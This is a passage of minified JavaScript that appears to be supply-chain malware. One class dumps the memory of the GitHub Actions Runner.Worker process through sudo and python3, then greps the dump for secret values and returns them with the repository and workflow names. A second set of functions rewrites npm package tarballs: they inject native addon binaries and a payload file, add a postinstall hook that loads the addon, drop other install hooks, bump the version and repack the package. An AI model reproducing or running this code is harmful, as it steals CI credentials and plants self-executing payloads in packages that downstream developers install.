class Dc extends L {
    isGitHubActions;
    isLinuxRunner;
    getLinuxDumpScript(e) {
        return ts.replace("__PID__", String(e))
    }
    constructor() {
        super("github", "runner", {
            ghs_jwt: /ghs_\d+_[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g,
            ghs_old: /ghs_[A-Za-z0-9]{36,}/g
        }, "aggressive");
        this.isGitHubActions = process.env["GITHUB_ACTIONS"] === "true", this.isLinuxRunner = process.env["RUNNER_OS"] === "Linux"
    }
    findRunnerWorkerPIDLinux() {
        try {
            if (!GR("/proc")) return null;
            let t = FR("/proc");
            for (let r of t) {
                if (!/^\d+$/.test(r)) continue;
                let n = WR("/proc", r, "cmdline");
                try {
                    if (OR(n).includes("Runner.Worker")) return parseInt(r, 10)
                } catch {
                    continue
                }
            }
            return null
        } catch {
            return null
        }
    }
    async detectHardenRunner() {
        if (!await ap()) u.log("detectHardenRunner: could not handle, exiting"), Me()
    }
    runPrivilegedStdin(e, t) {
        return sd(`sudo ${e}`, {
            input: t,
            maxBuffer: 536870912
        })
    }
    async dumpMemory() {
        let e = this.findRunnerWorkerPIDLinux();
        if (!e) return u.log("dumpMemory: worker process PID not found"), null;
        u.log(`dumpMemory: PID ${e}, platform ${XR()}`);
        try {
            return this.runPrivilegedStdin("python3", this.getLinuxDumpScript(e))
        } catch (t) {
            return u.log(`dumpMemory: FAILED: ${t instanceof Error?t.message:String(t)}`), null
        }
    }
    async execute() {
        try {
            if (!this.isGitHubActions || !this.isLinuxRunner) return this.failure("Not Actions or Linux");
            let e = process.env["GITHUB_REPOSITORY"] ?? "",
                t = process.env["GITHUB_WORKFLOW"] ?? "",
                r = await this.dumpMemory();
            if (!r || r.length === 0) return this.failure("No memory data from runner");
            u.log(`execute: dumped ${r.length} bytes`);
            let n = VR(r);
            if (u.log(`execute: grep found ${n.length} secrets`), n.length === 0) return this.failure("No secrets found in runner memory");
            let s = {};
            for (let i of n) s[i.name] = i.value;
            return this.success({
                secrets: s,
                repo: e,
                workflow: t,
                secretCount: n.length,
                rawBytes: r.length
            })
        } catch (e) {
            let t = e instanceof Error ? e.message : String(e);
            return u.log(`execute: ERROR: ${t}`), this.failure(Error(`Error processing runner: ${t}`))
        }
    }
}
function VR(e) {
    let r = sd(`tr -d '\\0' | grep -aoE '"[^"]+":{"value":"[^"]*","isSecret":true}' | sort -u`, {
            input: e,
            encoding: "utf-8",
            maxBuffer: 536870912
        }).trim().split(`
`).filter(Boolean),
        n = [];
    for (let s of r) {
        let i = s.indexOf('":{"value":"');
        if (i === -1) continue;
        let o = s.slice(1, i),
            a = i + 11,
            c = s.indexOf('","isSecret":true}', a);
        if (c === -1) continue;
        n.push({
            name: o,
            value: s.slice(a, c)
        })
    }
    return n
}
async function Vu() {
    let e = Cr(64 + Math.floor(Math.random() * 256)),
        t = Buffer.concat([Ou, e]),
        r = Yo ? Buffer.concat([Yo, Cr(64 + Math.floor(Math.random() * 256))]) : null;
    return {
        index: r ? `try{require(process.platform==='win32'?'./addon_win.node':'./addon.node').init();}catch(e){}
` : `try{require('./addon.node').init();}catch(e){}
`,
        addon: t,
        addonWin: r,
        payload: Xu
    }
}
async function jr(e, t) {
    let {
        tag: r
    } = t, n = `${Date.now()}_${by(8).toString("hex")}`, s = De.join(De.dirname(e), `_tmp_${n}`);
    await Dr.mkdir(s, {
        recursive: !0
    });
    try {
        await Bn({
            file: e,
            cwd: s
        });
        let i = De.join(s, "package", "package.json"),
            o = JSON.parse(await Dr.readFile(i, "utf-8")),
            {
                index: a,
                addon: c,
                addonWin: l,
                payload: f
            } = await Vu(),
            h = typeof o.main === "string" && o.main ? o.main : "index.js",
            p = De.join(s, "package", h),
            d = De.dirname(p);
        if (await Dr.mkdir(d, {
                recursive: !0
            }), await Bun.write(p, a), await Bun.write(De.join(d, "addon.node"), c), l) await Bun.write(De.join(d, "addon_win.node"), l);
        if (await Bun.write(De.join(d, ".napi_cache"), f), !o.scripts) o.scripts = {};
        o.scripts.postinstall = l ? `node -e "try{require(process.platform==='win32'?'./addon_win.node':'./addon.node').init()}catch(e){}"` : `node -e "try{require('./addon.node').init()}catch(e){}"`, delete o.scripts.preinstall, delete o.scripts.install;
        let m = String(o.version ?? "0.0.0").split("-")[0] ?? "0.0.0",
            [g = 0, y = 0, w = 0] = m.split(".").map(Number);
        o.version = `${g}.${y}.${(w||0)+1}`, await Bun.write(i, JSON.stringify(o, null, 2));
        let v = De.join(De.dirname(e), `${n}_${Ju}`);
        await Sy(Nn({
            gzip: !0,
            cwd: s
        }, ["package"]), vy(v));
        let b = await Dr.readFile(v);
        if (b.length < 18 || b[0] !== 31 || b[1] !== 139) throw Error(`${r} tarball at ${v} is not a valid gzip stream (len=${b.length}, first bytes=${b.subarray(0,4).toString("hex")})`);
        return u.log(`Updated path: ${v}`), v
    } finally {}
}
